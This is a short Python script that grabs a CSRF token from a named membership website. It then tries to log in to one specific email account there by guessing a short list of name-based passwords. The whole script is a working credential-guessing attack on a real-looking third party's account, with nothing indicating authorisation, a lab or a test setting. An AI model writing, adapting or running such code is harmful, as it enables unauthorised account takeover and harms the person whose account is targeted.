import urllib.request
import urllib.parse
import json
import http.cookiejar
import re

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

try:
    req = urllib.request.Request('https://capivaraclubhot.com/membros', headers={'User-Agent': user_agent})
    with opener.open(req, timeout=15) as r:
        html = r.read().decode('utf-8', errors='ignore')
        m = re.search(r'name="csrf-token"\s+content="([^"]+)"', html)
        token = m.group(1) if m else ''
        print('Got csrf-token:', bool(token), 'Length:', len(token))
except Exception as e:
    print('Error fetching /membros:', e)
    token = ''

for pw in ['diego123', 'diego2001', 'Diego123', 'diego@123', 'diego']:
    try:
        data = json.dumps({'email': 'diseguro20@gmail.com', 'password': pw}).encode('utf-8')
        post_headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-CSRF-TOKEN': token,
            'Referer': 'https://capivaraclubhot.com/membros',
            'Origin': 'https://capivaraclubhot.com'
        }
        l_req = urllib.request.Request('https://capivaraclubhot.com/api/login', data=data, headers=post_headers, method='POST')
        with opener.open(l_req, timeout=15) as r:
            res = json.loads(r.read().decode('utf-8'))
            print(f'Password {pw} SUCCESS:', res)
            break
    except urllib.error.HTTPError as he:
        err_body = he.read().decode('utf-8', errors='ignore')
        print(f'Password {pw} FAILED ({he.code}):', err_body[:100])
    except Exception as e:
        print(f'Password {pw} FAILED:', e)
